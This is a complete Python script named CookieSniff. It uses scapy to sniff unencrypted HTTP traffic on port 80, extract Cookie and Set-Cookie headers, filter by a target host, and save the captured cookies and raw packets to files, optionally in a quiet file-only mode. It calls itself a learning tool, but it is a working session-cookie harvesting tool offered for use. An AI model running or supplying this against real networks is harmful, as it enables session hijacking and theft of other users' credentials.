import argparse
import logging
import sys
import time
from datetime import datetime
from scapy.all import sniff, IP, TCP, Raw

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(message)s',
    handlers=[
        logging.FileHandler('cookiesniff.log'),
        logging.StreamHandler(sys.stdout)
    ]
)

class CookieSniff:
    def __init__(self, interface=None, host=None, max_packets=100, quiet=False, save_raw=False):
        self.interface = interface
        self.host = host
        self.max_packets = max_packets
        self.quiet = quiet
        self.save_raw = save_raw
        self.packet_count = 0
        self.cookies = []
        self.raw_file = f"cookiesniff_raw_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt" if save_raw else None

    def process_packet(self, packet):
        """Process sniffed packets to extract HTTP cookies."""
        if self.packet_count >= self.max_packets:
            return False  # Stop sniffing

        if packet.haslayer(Raw) and packet.haslayer(TCP):
            try:
                payload = packet[Raw].load.decode('utf-8', errors='ignore')
                if 'Cookie:' in payload or 'Set-Cookie:' in payload:
                    src_ip = packet[IP].src
                    dst_ip = packet[IP].dst
                    if not self.host or self.host in (src_ip, dst_ip):
                        cookie_lines = [line for line in payload.split('\n') if 'Cookie:' in line or 'Set-Cookie:' in line]
                        if cookie_lines:
                            cookie_data = {
                                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                                'src_ip': src_ip,
                                'dst_ip': dst_ip,
                                'cookies': cookie_lines
                            }
                            self.cookies.append(cookie_data)
                            logging.info(f"Cookie captured: {src_ip} -> {dst_ip}, {cookie_lines}")

                            if self.save_raw:
                                with open(self.raw_file, 'a') as f:
                                    f.write(f"[{cookie_data['timestamp']}] {src_ip} -> {dst_ip}\n{payload}\n{'-'*50}\n")

                self.packet_count += 1
            except Exception as e:
                logging.error(f"Error processing packet: {str(e)}")

    def start(self):
        """Start sniffing packets."""
        logging.info(f"Starting CookieSniff: Interface={self.interface or 'any'}, Host={self.host or 'all'}, MaxPackets={self.max_packets}")
        filter_str = "tcp port 80"
        try:
            sniff(
                iface=self.interface,
                filter=filter_str,
                prn=self.process_packet,
                store=0,
                stop_filter=lambda x: self.packet_count >= self.max_packets
            )
        except Exception as e:
            logging.error(f"Error during sniffing: {str(e)}")
        finally:
            self.save_results()

    def save_results(self):
        """Save captured cookies to a text file."""
        output_file = f"cookiesniff_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(output_file, 'w') as f:
            for cookie_data in self.cookies:
                f.write(f"[{cookie_data['timestamp']}] {cookie_data['src_ip']} -> {cookie_data['dst_ip']}\n")
                for cookie in cookie_data['cookies']:
                    f.write(f"{cookie}\n")
                f.write(f"{'-'*50}\n")
        logging.info(f"Results saved to {output_file}")
        if self.save_raw:
            logging.info(f"Raw packets saved to {self.raw_file}")

def main():
    parser = argparse.ArgumentParser(description="CookieSniff - A tool to capture HTTP cookies for network learning.")
    parser.add_argument('-i', '--interface', help='Network interface (e.g., eth0)')
    parser.add_argument('-H', '--host', help='Target host IP to filter cookies')
    parser.add_argument('-m', '--max-packets', type=int, default=100, help='Max packets to capture (default: 100)')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode (log to file only)')
    parser.add_argument('-r', '--save-raw', action='store_true', help='Save raw packet data')

    args = parser.parse_args()

    if args.quiet:
        logging.getLogger().handlers = [logging.FileHandler('cookiesniff.log')]

    sniffer = CookieSniff(
        interface=args.interface,
        host=args.host,
        max_packets=args.max_packets,
        quiet=args.quiet,
        save_raw=args.save_raw
    )

    try:
        sniffer.start()
    except KeyboardInterrupt:
        logging.info("CookieSniff stopped")

if __name__ == "__main__":
    main()